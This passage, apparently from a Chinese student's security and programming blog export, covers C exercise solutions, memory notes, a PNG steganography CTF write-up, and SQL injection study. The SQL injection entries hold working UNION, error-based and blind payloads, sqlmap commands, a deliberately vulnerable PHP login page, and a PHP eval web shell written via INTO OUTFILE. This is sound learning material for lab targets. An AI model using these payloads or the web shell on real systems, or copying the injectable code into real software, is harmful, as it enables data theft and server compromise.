你只有一个办法，放下手里的活，去执行。但是，执行完了之后，等你回来，难道你要重新开始数钱么？当然不会。这个时候，最聪明的做法，就是，在你转去执行main之前，先记录一下你现在数了多少张，并且卡一个书签在数过及没数过的钱之间。 这个书签，就是返回地址。你回来之后，从这个位置开始继续往下数钱。这个记录下来的已数过钱的数额，就是所谓的现场信息。 在操作系统中，没有书签这个东西。他们会记录下一些当时cpu跳转之前，周围一些必要的数据信息，以便于回来之后继续执行 而这些信息，它是带到了main的栈区里面去保存的。 在执行main函数时，它会放心大胆滴修改cpu各个寄存器的值。各条总线的值，各个开关的值。 等执行完程序，回来之后，它会按照栈区里面弹出来的这个现场信息的内容，去恢复现在的现场，恢复成调用之前的样子，然后继续作后面的事。 关于内存泄漏内存泄漏的原理内存泄露的原理，当我们再堆区中分配的内存如果没有手工释放，程序结束后会把栈中的内存回收释放，该栈中保存了一个指向堆区元素的指针。然而这个指针一旦释放了后，就再也没有元素指向堆区的那块元素，然而堆区中的那块元素又没有释放，这自然而然的造成了内存泄露。 垃圾对象回收几种语言的比较C和C++没有垃圾回收机制，所以一旦malloc之后的空间不再使用，成为垃圾之后，需要程序员自己去调用free函数来释放空间。 PHP 销毁资源使用析构函数。析构函数是在对象被销毁时自动释放的，不需要调用。 JAVA （因为自己还没有学到JAVA的垃圾回收，只能通过网上的这些资料，等学到了，再用自己的语言总结一下） Java中的垃圾回收与对象生命周期 堆内存在JVM启动的时候被创建，堆内存中所存储的对象可以被JVM自动回收，不能通过其他外部手段回收，也就是说开发人员无法通过添加相关代码的手段来回收堆内存中的对象。堆内存通常情况下被分为两个区域：新对象区域与老对象区域。 新对象区域：又可细分为三个小区域：伊甸园区域、From区域与To区域。伊甸园区域用来保存新创建的对象，它就像一个堆栈，新的对象被创建，就像指向该栈的指针在增长一样，当伊甸园区域中的对象满了之后，JVM系统将要做到可达性测试，主要任务是检测有哪些对象由根集合出发是不可达的，这些对象就可以被JVM回收，并且将所有的活动对象从伊甸园区域拷贝到To区域，此时一些对象将发生状态交换，有的对象就从To区域被转移到From区域，此时From区域就有了对象。上面对象迁移的整个过程，都是由JVM控制完成的。 老对象区域：在老对象区域中的对象仍然会有一个较长的生命周期，大多数的JVM系统垃圾对象，都是源于”短命”对象，经过一段时间后，被转入老对象区域的对象，就变成了垃圾对象。此时，它们都被打上相应的标记，JVM系统将会自动回收这些垃圾对象，建议不要频繁地强制系统作垃圾回收，这是因为JVM会利用有限的系统资源，优先完成垃圾回收工作，导致应用无法快速地响应来自用户端的请求，这样会影响系统的整体性能。]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SYC基础C语言(A~P)writeup]]></title>
    <url>%2F2017%2F09%2F07%2FSYC%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80-A-P-writeup%2F</url>
    <content type="text"><![CDATA[慈母手中线，游子身上衣。 前言不知不觉暑假已经过去了，更加恐怖的是，我已经开学了几天了，开学这几天在做SYC上面的C语言，一个原因是受人所托，二呢，一个暑假都没有看过写过C了，自己有好多都忘记了。而且做的时候，发现上学期学的C真的很基础，很简单，很多C里面的东西都没有学到，就正好get一些新的知识啦~ 编程题是根据字母（A~Z）分类的，后面5道是给学长做的（哇，学姐就不能做了么，抠鼻），但是好吧，我自己觉得前面(A~P)才是属于基础一些的题目，所以写的WP就从P开始分类吧。 题目和代码说明这里面的题基本都用了一个相同的点，也是我之前没见过的，就是你没说停下，就可以一直输入。大概是长这个样子 未给定行数的用while(scanf(它的参数)!=EOF)处理 然后那种简单的题目，就不贴思路了~有些题目有很多种方法，就直接写在下面注释了，也是可以用的~ A-ASCII码排序#include &lt;stdio.h&gt; int main (void) { char s[3],m,x,y,z; while (scanf(&quot;%s&quot;,s)!=EOF) { x=s[0]; y=s[1]; z=s[2]; if(x&gt;y) { m=x; x=y; y=m; } if(x&gt;z) { m=x; x=z; z=m; } if(y&gt;z) { m=y; y=z; z=m; } printf(&quot;%c %c %c\n&quot;,x,y,z); } return 0; } /*{ if(x&gt;z &amp;&amp; y&gt;z) { printf(&quot;%c %c %c\n&quot;,z,x,y); } else if(x&lt;z &amp;&amp; y&gt;z) { printf(&quot;%c %c %c\n&quot;,x,z,y); } else if(x&lt;z &amp;&amp; y&lt;z) { printf(&quot;%c %c %c\n&quot;,x,y,z); } } fflush(stdin);//清除输入缓冲区*/ /* char m,x,y,z; while (scanf(&quot;%c%c%c&quot;,&amp;x,&amp;y,&amp;z)!=EOF) { fflush(stdin); if(x&gt;y) { m=x; x=y; y=m; } if(x&gt;z) { m=x; x=z; z=m; } if(y&gt;z) { m=y; y=z; z=m; } printf(&quot;%c %c %c\n&quot;,x,y,z); */ B-计算两点间的距离#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;math.h&gt; int main (void) { double x1,y1,x2,y2; double length; while(scanf(&quot;%lf%lf%lf%lf&quot;,&amp;x1,&amp;y1,&amp;x2,&amp;y2)!=EOF) { length=sqrt((x1-x2)*(x1-x2)+(y1-y2)*(y1-y2)); printf(&quot;%.2lf\n&quot;,length); } return 0; } C-计算球的体积#include &lt;stdio.h&gt; #define PI 3.1415927 int main(void){ double r,v; while(scanf(&quot;%lf&quot;,&amp;r)!=EOF) { v=((r*r*r)*4*PI)/3; printf(&quot;%.3lf\n&quot;,v); } return 0; } D-求绝对值#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;math.h&gt; int main (void) { double x; while (scanf(&quot;%lf&quot;,&amp;x)!=EOF) { printf(&quot;%.2lf\n&quot;,fabs(x)); } return 0; } E-Digital Roots思路这个题一开始没有做，因为可能是懒吧，不想看英语，然后强迫症觉得少了一个题，很不开心，就硬着头皮把他读下来了题意：把输入的数每个位上的数相加，一直加到只剩一个数为止eg：39 3+9=12 1+2=3 这个题目有坑哦~因为这题测试数据可能会很长，所以不能一位一位数字来取，又想到用字符串的方式处理。 代码#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char str[10000]; int sum; int i; while (scanf(&quot;%s&quot;, str) != EOF) { if(str[0]==&apos;0&apos;) { break; } sum = 10; while (sum &gt;= 10) { sum = 0; for (i = 0; str[i] != 0; i++) { sum += str[i] - &apos;0&apos;; } sprintf(str, &quot;%d&quot;, sum); } printf(&quot;%d\n&quot;, sum); } return 0; } 新知识在这里新学会了一个sprintf 的运用贴一个链接sprintf的运用 #include&lt;stdio.h&gt; int main(void) { char s[40]; sprintf(s,&quot;%s%d%c&quot;,&quot;test&quot;,1,&apos;2&apos;); //存到字符串里面去了 /*第一个参数就是指向要写入的那个字符串的指针，剩下的就和printf()一样了 //可以比较一下，这是向屏幕输入 // printf(&quot;%s%d%c&quot;,&quot;test&quot;,1,&apos;2&apos;); printf(&quot;%s&quot;,s); return 0; } 因此上面的代码可以简化成为这样（然而，这个代码我没有扔到题目上，只是本地测试了一下，是可以的） #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main (void) { char s[1000]; int sum,i; while (scanf(&quot;%s&quot;,s) != EOF) { if(strcmp(s,&quot;0&quot;) == 0) { break; } sum =10; while (sum &gt;= 10) { sum =0; for (i=0;s[i] != &apos;\0&apos;;i++) { sum+= s[i] - &apos;0&apos;; if(sum &gt; 9) { sum=sum%10+sum/10; } } //sprintf(s, &quot;%d&quot;, sum);//真的很方便啊！ } printf(&quot;%d\n&quot;,sum); } return 0; } F-求奇数的乘积#include &lt;stdio.h&gt; int main(void) { int n,num[100],i; int res; while (scanf(&quot;%d&quot;,&amp;n) != EOF) { res = 1; for(i=0;i&lt;n;i++) { scanf(&quot;%d&quot;,&amp;num[i]); if(num[i]%2!=0) { res*=num[i]; } } printf(&quot;%d\n&quot;,res); } return 0; } G-数值统计#include &lt;stdio.h&gt; int main(void) { int n,i; double a[100]; int num1,num2,num3; while (scanf(&quot;%d&quot;,&amp;n)!= EOF) { num1=0;num2=0;num3=0; if(n==0) { break; } for (i=0;i&lt;n;i++) { scanf(&quot;%lf&quot;,&amp;a[i]); if(a[i] ==0) { num2++; } else if(a[i] &lt;0 ) { num1++; } else if(a[i]&gt;0) { num3++; } } printf(&quot;%d %d %d\n&quot;,num1,num2,num3); } return 0; } H-多项式求和思路一开始把题目都看错了，以为都是加，还说怎么一直都没有正确答案，后来才看到自己题目都理解错了。既然有加有减，那肯定和（-1）的n次方有关了啊 代码#include &lt;stdio.h&gt; int main(void) { int m=-1; int n,i,j; int num[100]; double sum; while (scanf(&quot;%d&quot;,&amp;n) != EOF) { for(i=0;i&lt;n;i++) { scanf(&quot;%d&quot;,&amp;num[i]); sum=0; m=-1; for (j=1; j&lt;=num[i]; j++) { m = m*(-1); sum = sum+ m*(1.0/j); } printf(&quot;%.2lf\n&quot;,sum); } } return 0; } 新知识这里学了一个关于A的B次方的C语言用法 利用math.h中的pow（）函数进行：函数定义如下： double pow(double x,double y) 可以实现x的y次幂（返回值） example： #include &lt;stdio.h&gt; #include &lt;math.h&gt; int main() { printf(&quot;%f&quot;,pow(2,3)); return 0; } I-蟠桃记思路这个题开始我想用递归做的，后来觉得这样太麻烦了，可以直接倒推回去（剩下的桃子+1）*2 就是上一天的桃子啊 代码#include &lt;stdio.h&gt; int main(void) { int n,sum,i; while (scanf(&quot;%d&quot;,&amp;n) != EOF) { sum=1; for(i=1;i&lt;n;i++) { sum=(sum+1)*2; } printf(&quot;%d\n&quot;,sum); } return 0; } J-Encoding题意就是计算出现相同字母的次数，1的时候不用标注 代码#include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;math.h&gt; int main(void) { int n,i,num; char str[10000]; int length; scanf(&quot;%d&quot;,&amp;n); while(n--) { num=1; scanf(&quot;%s&quot;,str); length=strlen(str); for(i=0;i &lt; length;i++) { if(str[i]==str[i+1]) { num++; } else { if(num&lt;=1) { printf(&quot;%c&quot;,str[i]); num=1; } else { printf(&quot;%d%c&quot;,num,str[i]); num=1;//一定记得为1，不然后面出问题 } } } printf(&quot;\n&quot;); } return 0; } K-字符串统计#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(void) { int n,i; int num; char s[1000]; scanf(&quot;%d&quot;,&amp;n); while (n--) { scanf(&quot;%s&quot;,s); num=0; for(i=0;i&lt;strlen(s);i++) { if(s[i] &gt;=&apos;0&apos; &amp;&amp; s[i] &lt;=&apos;9&apos;) { num++; } } printf(&quot;%d\n&quot;,num); } return 0; } L-数列有序！####注意这个题应该是可以采取折半查找的，做的时候没有想到。实在是不应该。这个题用的是冒泡排序 代码#include &lt;stdio.h&gt; int main(void) { int n,m,i,j; int a[100]; int temp; while (scanf(&quot;%d%d&quot;,&amp;n,&amp;m)!=EOF) { if(n==0 &amp;&amp; m==0) { break; } else { for(i=0;i&lt;n;i++) { scanf(&quot;%d&quot;,&amp;a[i]); } a[n]=m; for(i=0;i&lt;n+1;i++) { for (j=0;j&lt;n;j++) { if(a[j]&gt;a[j+1]) { temp=a[j]; a[j]=a[j+1]; a[j+1]=temp; } } } for (i=0;i&lt;n+1;i++) { if(i==n) { printf(&quot;%d&quot;,a[i]); } else { printf(&quot;%d &quot;,a[i]); } } printf(&quot;\n&quot;); } } return 0; } M-求平均成绩#include &lt;stdio.h&gt; #include &lt;math.h&gt; int main(void) { int n,m,sum,count,i,j,flag; int a[50][50]; double ave1[50],ave2[50]; while (scanf(&quot;%d%d&quot;,&amp;n,&amp;m) != EOF) { for (i=0;i&lt;n;i++) { for (j=0;j&lt;m;j++) { scanf(&quot;%d&quot;,&amp;a[i][j]); } } //每个人平均成绩 for(i=0;i&lt;n;i++) { sum=0; for(j=0;j&lt;m;j++) { sum+=a[i][j]; } ave1[i]=(sum*1.0)/m; } //每门课的平均成绩 for(j=0;j&lt;m;j++) { sum=0; for(i=0;i&lt;n;i++) { sum+=a[i][j]; } ave2[j]=(sum*1.0)/n; } //这里比较的时候一定要注意，他是成绩每一科目都要比较，但是是一个人 count=0; for(i=0;i&lt;n;i++) { flag=0; for(j=0;j&lt;m;j++) { if(a[i][j]&gt;=ave2[j]) { flag++; } if(flag==m-1) { count++; } } } /* 第二种方法 count=0; for(i=0;i&lt;n;i++) { flag=1; for(j=0;j&lt;m;j++) if(a[i][j]&lt;ave2[j]) { flag=0; break; } if(flag) count++; }*/ for(i=0;i&lt;n;i++) { if(i==n-1) printf(&quot;%.2lf\n&quot;,ave1[i]); else printf(&quot;%.2lf &quot;,ave1[i]); } for(i=0;i&lt;m;i++) { if(i==m-1) printf(&quot;%.2lf\n&quot;,ave2[i]); else printf(&quot;%.2lf &quot;,ave2[i]); } printf(&quot;%d\n\n&quot;,count); } return 0; } N-查找最大元素#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(void) { char s[100]; int i,j,len; char max; while (scanf(&quot;%s&quot;,s) != EOF) { len=strlen(s); max=&apos;a&apos;; for (i=0;i&lt;len;i++) { if(s[i]&gt;max) { max=s[i]; } } for (i=0;i&lt;len;i++) { if(s[i]==max) printf(&quot;%c(max)&quot;,s[i]); else printf(&quot;%c&quot;,s[i]); } printf(&quot;\n&quot;); } return 0; } O-Text Reverse题意字符串以一个空格为间隔，倒序排列。Sample Input 3 olleh !dlrow m&apos;I morf .udh I ekil .mca Sample Output hello world! I&apos;m from hdu. I like acm. 思路将空格提取出来，空格以前的字符串存储起来，再进行倒序。注意输入的换行要读取了，不然会出错 #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(void) { int n,i,j,len,k; char s1[1000]; scanf(&quot;%d&quot;,&amp;n); getchar();//换行 while(n--) { gets(s1); len=strlen(s1); for (i=0,j=0;i&lt;len;i++) { if(s1[i]==&apos; &apos;)//要用单引号 而不是双引号 { for(k=i-1;k&gt;=j;k--) { printf(&quot;%c&quot;,s1[k]); } printf(&quot; &quot;); j=i+1; } } for(k=len-1;k&gt;=j;k--)//最后一个单词的输出 { printf(&quot;%c&quot;,s1[k]); } printf(&quot;\n&quot;); } return 0; } P-人见人爱A^B####注意这个题要注意int的溢出问题如果我们只是采用一直算的话，不能找到一个数据类型来储存这个数，因此，这个办法是不行的。我们知道，要知道一个幂的后三位，只需要对这个数一直%1000即可，比如1230%1000=230；2323456789%1000=789……这样我们这个问题就简单了，只要每次乘以一个数对1000取余即可。 代码#include&lt;stdio.h&gt; int main() { int a,b,s,i; while(scanf(&quot;%d%d&quot;,&amp;a,&amp;b)!=EOF) { if(a==0&amp;&amp;b==0) break; s=a; for(i=1;i&lt;b;i++) { s=(s*a)%1000; } printf(&quot;%d\n&quot;,s); } return 0; } 后记磨蹭了几天把前面的题写了。后面的题写了几道，发现有些需要数据结构的知识，只能边学边写了。这里只恨自己不会python，因为平台13号就要关闭了，要是可以自己爬下来多练习练习就好了。而且很多这些代码都没有考虑代码的健壮性。就只能勉强说暂且作为复习C用吧。这些题目也是一些很基础的ACM题目吧，现在平台第一名是一个对ACM很感兴趣的人，和他交流之后，更加提升了我对算法的兴趣，想这学期结合一下数据结构学习一些算法吧。 反思1.调试进入函数内部问题2.循环的时候，定义的变量到底是在循环内（循环内，每次循环就要重新被赋值，要想清楚）3.换行，空格这些字符，要注意清除缓存fflush(stdin);或者getchar();4.学到的新知识 1）E题型的sprintf的运用 2）H题型想到的关于A的B次方的C语言用法]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端验证sql]]></title>
    <url>%2F2017%2F08%2F25%2F%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81sql%2F</url>
    <content type="text"><![CDATA[夜如何其？夜未央 写了一个前端验证，html也忘记了，页面写的很粗略，将就看一下，毕竟是我人生第一个自己写的漏洞。 主界面，省略掉测试他是否有漏洞。 id处输入： 1’ or 1=1# 省略中间步骤，直接爆一下东西： 输入：1’ and 1=2 union select 1,2,group_concat(username,0x3a,password) from user# 这里贴一下我的代码： &lt;html&gt; &lt;head&gt; &lt;title&gt;M3tar的第一个注入&lt;/title&gt; &lt;meta http-equiv=&quot;content-type&quot;content=&quot;text/html&quot;charset=&quot;Unicode&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;M-star.php&quot; method=&quot;post&quot;&gt; &lt;h1&gt;Sql注入&lt;/h1&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;id&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;用户名&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密 码&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php if($_POST){ $con=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;m3tar&quot;,$con); $id = $_POST[&apos;id&apos;]; $sql=&quot;select * from user where id=&apos;$id&apos;&quot;; $query=mysql_query($sql,$con); $arr=mysql_fetch_array($query, MYSQL_ASSOC); if(!empty($arr)){ echo &apos;&lt;pre&gt;&apos;,print_r($arr,1),&apos;&lt;/pre&gt;&apos;; }else{ echo &quot;输入有误&quot;; } } ?&gt; 关于写代码学到的一点点心得： 1）php：写这个还是要对php有那么一点点的了解，对于数据库编程的内容也要有一些了解： 数据库的三层结构：客户端 mysql dbms 数据对象 2）可以总结一下mysql扩展库操作mysql数据库的步骤 3）关于phpstudy的理解： 以前只是下了phpstudy，知道往WWW下扔东西，才知道还可以秒切换版本，很不错的功能，希望以后能多加应用。因为写一==这个个简单的sql注入漏洞的界面，emmm，很难受，写不来数据库，百度了半天，很瓜，原来phpstudy里面就可以新建数据库（phpMyadmin、Mysql-front），赶紧照着百度依葫芦画瓢，第一次接触这个自己后台的数据库，非常的兴奋。还有其他问题，现在还没有怎么遇到，以后再补充。 4)html和css感觉白学了，都记不得了，要抓紧时间补足啊。 5）POST和GET参数分别的优势和劣势 http://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html 详细的可以看这个资料]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql学习</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基础sql总结]]></title>
    <url>%2F2017%2F08%2F25%2F1%2F</url>
    <content type="text"><![CDATA[我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。摘要：总结一些基础的sql语句。 SQL注入原理&nbsp;&nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 SQL注入分类&nbsp;&nbsp;sql注入分类主要还是分为数字型注入和字符型注入。至于说的post注入，cookie注入，http头注入，盲注···个人觉得都是可以分开囊括在里面的，只是这些是根据注入字段在的位置进行的命名。 下面就讲一些学到现在我见过的的注入分类吧。 GET注入 POST注入 http头注入 cookie注入 报错的注入 布尔盲注 基于时间的盲注 注入基本操作 （GET注入为例）第一步：判断是否存在注入GET注入一般看源代码就可以看到。形如：$_GET[“ID”] ID就是参数 以id为例： 1） url ? id=1 返回正常 2） url ? id=1’ 出错，页面异常 3） url ? id=1 and 1=1 返回正常 4） url ? id=1 and 1=2 返回错误 以上步骤满足，可能存在SQL注入漏洞 总结： 出现过的SQL语句总结： （不构造那种双闭合语句，一定记得注释 –+ 或者 #） 1）select * from table where id = &apos;input&apos; 2) select * from table where id = (&apos;input&apos;) 3) select * from table where id = (&quot;input&quot;) 4) select * from table where id = (input) 第二步： 找到注入点，进行基础的sql语句尝试：（以下是用GET注入为例的） 第一步：用 order by 来爆字段数，如果没有反应，则在后面加–+或者/*或者#注释掉后面的内容 http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=1&apos;)) order by 5 --+ 第二步：显示错误位，and 1=2 union select 1,2,3,4,5,6，…..（这一步一定记得前面必须输入错误的，才能爆出敏感信息） http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=-1&apos; union select 1,2,3--+ 爆库:select SCHEMA_NAME from information_schema.SCHEMATA limit 5,1 第三步：显示版本，当前用户，数据库路径， 1） and 1=2 union select 1,2,group_concat(version(),0x3a,user(),0x3a,@@datadir),4 2） and 1=2 union select 1,2,database() 第四步：爆表 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 第五步：爆列 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;表名的hex&apos; （&apos;users&apos;）--+ 第六步： 爆字段 and 1=2 union select 1,2,group_concat(username,0x3a,password) from 表名 (不用单引号）--+ POST注入 解决方式：burpsuite + sqlmap最简单的比如：前端验证， 直接绕过即可 这里详细讲述一下利用sqlmap解决的办法： 1）抓包，最后一行就是参数值sqlmap -u &quot;url&quot; --data &quot;参数（就是最后一行）&quot; --risk=3 --level=5 --dbs 2）将抓包得到的post请求复制为txt 注意：在kali里面新建文件夹后使用vim vim使用方法： vim 1.txt 回车 粘贴内容 esc键:wq 回车 运行sqlmap并使用如下命令（ 括号里面可以不写 ）： ./sqlmap -r search-1.txt (-p 参数) 或者： sqlmap -r &quot;1.txt&quot; -p &quot;参数&quot; --dbs 这里参数 -r 是让sqlmap加载我们的post请求1.txt，而-p 应该比较熟悉，指定注入用的参数(如果没写，就会自己检测的) 3）自动搜索表单sqlmap -u url --forms HTTP头注入基本上http头都有可能出现能注入的地方。推荐阅读这个链接http头注入 cookie注入cookie注入，这里主要讲解一下利用sqlmap，因为手工的cookie注入，现在我还没遇到，遇到之后在做补充。 基本用法：&nbsp;&nbsp;这里要进行cookie注入，就要先注册，然后F12 就出现一个cookies 就可以进行cookie注入 相关语句 网上的相关资源 命令1跑表 sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --table --level 2 命令2字段 sqlmap -u &quot;URL&quot; --cookie &quot;参数&quot; --columns -T 表段 --level 2 命令3跑密码 sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --dump -T 表段 -C “字段，字段” --level 2 报错的注入步骤1)猜测注入语句，不再赘述. 2)语句测试，当使用 1’union selcet 1,2,3 –+ 返回还是正常页面，因此我们要利用报错信息 3) 1′ and ( select 1 from (select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name)b)–+ 含义：取名concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))为name，count()name的个数，这时候会报错，从而爆出database()的值，’~’的用途在于方便识别。 整个语句分析： 整体相当于select 1 from b； 其中b = select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name ，count()name的个数； name=concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2)) 4） 进行注入 语句构造： 1′and (select 1 from (select count(),(concat(“~”,(select 报错语句),”~”,floor(rand()2)))name from information_schema.tables group by name)b) 解释语句 floor() 是取整数 rand()在0和1之间产生一个随机数 rand(0)*2 将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2) 记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*) 是用来统计结果的，相当于刷新一次结果 group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1 在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次 个人常用的基于错误的语句1./*爆表库*/(select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆表库*/ 2./*爆当前(select 1 from (select count(*),(concat(“~”,current_user,”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆当前用户名*/ 3./*爆所有用户名*/(select 1 from (select count(*),(concat(“~”,(select username from users limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆所有用户名*/ 布尔盲注1)布尔盲注出现的情况当出现无论输入任何语句页面只有两种情况的时候，即只存在正确页面和错误页面时，而不显示报错信息，这样我们就需要进行布尔盲注。通过猜测目标字符串字符的ascii码来确定字符，但该过程非常繁琐，自动化工具更方便一些。 2)语句构造1’ and (ascii(substr(database(),1,1)))&gt;100 –+ 返回正确页面说明该范围正确，返回错误页面相当于范围不正确，最后用等号确定。 基于时间的盲注1)基于时间的盲注出现的情况这种情况下就是所有语句下页面只存在正确的一种，这样就用到了基于时间的盲注，原理是如果正确就执行sleep()函数，使程序挂起，这样我们就可以知道语句正确还是错误了。一般使用sleep(5)，使程序挂起5秒钟。 2)语句构造1′ and (select if (ascii(substr(database(),1,1))&gt;100,sleep(5),NULL)) –+ 数据库名称第一个字符的ascii码是否大于100，正确则产生5s的延迟，错误则返回空。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。 也有benchmark()延时注入，与sleep用法相似。 其他一句话提权等直接写一句话(要知道物理路径) ，连接菜刀 and 1=2 union select 1,2,&apos;&lt;?php @eval($_post[&quot;mima&quot;]) ?&gt;&apos;,4 into outfile &apos;D:\\xampp\\www\\test.php&apos; --+ 记住一定要用两个反斜杠，用一个的话可能会出现转义 中间插入如果强行要在1，**，3中插入 语句这样构造： 爆表： id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;database&apos; --+ 一些语句的解释1.group_concat的意思是全部列出来 2.version()——MySQL版本 3.concat(str1,str2…)——没有分隔符地连接字符串 4.concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 5.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据 6.0x3a是”:”的十六进制，在这里把它作为分隔符]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>sql学习</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[png图片隐写]]></title>
    <url>%2F2017%2F08%2F22%2F1%2F</url>
    <content type="text"><![CDATA[前尘隔海，古屋不再。 &nbsp;&nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。 考察内容1.LSB隐写 2.图片修复题目图片 知识储备扔一下相关学习的网站： 世安杯-LSB隐写-png：http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1 CTF之隐写：http://www.jianshu.com/p/02fdd5edd9fc 隐写术总结：http://bobao.360.cn/learning/detail/243.html stegsolve的用法：Stegsolve——Analyse——Frame Browser。浏览每个颜色通道的每一位，看是否隐藏了二维码（二维码在线解码：http://tool.chinaz.com/qrcode/） Stegsolve——Analyse——Data Extract。这个是使用ASCII隐写的时候可以查看的。 Stegsolve——Analyse——file format。查看文件格式，结合IDAT结构是否异常，结合编程。 Stegsolve——Analyse——frame browser。可以查看GIF文件每一帧的图片。 Stegsolve——Analyse——image combiner双图分析 LSB隐写&nbsp;&nbsp;这个题学到很多知识。简述一下，先看到提示，最低最低位，最开始跑偏了，想成了图片缺失，在最低位出现flag，后来改了像素，变成了另外一张图片，（当时的启发由于这个网站：http://www.jianshu.com/p/02fdd5edd9fc） 后来出现的图片出现了类似像素的东西，就很丑，，然后也不会了，再看一下，是一个png图片，考虑扔进stegsolve看一下，最低位， 隐约间看到了key:paaaasword LSB &nbsp;&nbsp;哎呦喂，以为出来了，看到hint，秘密之所以是秘密，因为秘密需要秘密去探寻，就考虑里面怕是有txt，LSB隐写，喜极而泣的在kali里面搞啊搞（搞的方法是：使用一个github上一个工具来处理-cloacked-pixel(具体用法见https://github.com/cyberinc/cloacked-pixel)。 &nbsp;&nbsp;我在kali下进行测试的。先将文件解压，并将png文件放进去，在命令行下进入到该文件夹。），密码试了7次（可能不止，还有自己输错的），最后密码是 ： paaaasword大概是在kali里面这样的情况： &nbsp;&nbsp;然后使用命令python lsb.py extract misc2.png 111.txt paaaassword可以得到隐写的文件111.txt。 ps:extract指的是提取misc2.png指的是导入文件名111.txt指的是导出文件名paaaasword指的是密码（此处根据提示猜测） &nbsp;&nbsp;当然，我天真的以为，txt里面就是我心心念念的flag，打开，试了的所有txt都是乱码， 图片修复我猜里面还有一个图片，winhex打开，看一下文件头， &nbsp;&nbsp;啧，和这个png很像嘛，百度一下文件头，http://www.jianshu.com/p/02fdd5edd9fc文件怕是损坏了，修复出来，编辑——粘贴字节8， 改后缀，png，看到曙光了，是个二维码， &nbsp;&nbsp;哇，兴奋的搓手手，赶紧在线解密， ，啥，识别不出来，用手机，还是识别不出来，哇，对比一下正常的二维码，定位点呢，定位点不对啊。搞到ps里面，emmm，截图成四块，第四块好像有一个反向，再拼起来，扫一下，终于对了。 做出来之后的我 本来还想打爆出题人，但是现在已经没有力气了。不过真的学到很多，嘻嘻嘻~]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
      <tags>
        <tag>CTF-Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片隐写术总结]]></title>
    <url>%2F2017%2F08%2F21%2F1%2F</url>
